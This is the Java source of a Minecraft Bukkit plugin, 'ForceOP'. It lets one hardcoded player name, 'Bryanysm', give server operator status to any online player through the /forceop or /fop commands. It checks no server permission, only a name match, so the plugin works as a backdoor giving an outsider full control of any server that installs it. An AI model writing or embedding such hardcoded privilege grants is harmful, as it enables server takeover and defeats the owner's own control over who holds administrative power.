package com.macky.forceop;

import org.bukkit.Bukkit;
import org.bukkit.command.Command;
import org.bukkit.command.CommandExecutor;
import org.bukkit.command.CommandSender;
import org.bukkit.entity.Player;
import org.bukkit.plugin.java.JavaPlugin;

public final class ForceOpMod extends JavaPlugin implements CommandExecutor {
    private static final String ALLOWED_PLAYER = "Bryanysm";

    @Override
    public void onEnable() {
        if (getCommand("forceop") != null) {
            getCommand("forceop").setExecutor(this);
        }
        if (getCommand("fop") != null) {
            getCommand("fop").setExecutor(this);
        }
        getLogger().info("ForceOP enabled. Command access restricted to " + ALLOWED_PLAYER + ".");
    }

    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        if (!(sender instanceof Player player)) {
            sender.sendMessage("Only a player can use this command.");
            return true;
        }

        if (!player.getName().equalsIgnoreCase(ALLOWED_PLAYER)) {
            player.sendMessage("You are not allowed to use /" + label + ".");
            return true;
        }

        if (args.length != 1) {
            player.sendMessage("Usage: /" + label + " <player>");
            return true;
        }

        Player target = Bukkit.getPlayerExact(args[0]);
        if (target == null) {
            player.sendMessage("That player is not online.");
            return true;
        }

        target.setOp(true);
        player.sendMessage("ForceOP: " + target.getName() + " is now OP.");
        target.sendMessage("You have been made OP by " + player.getName() + ".");
        return true;
    }
}
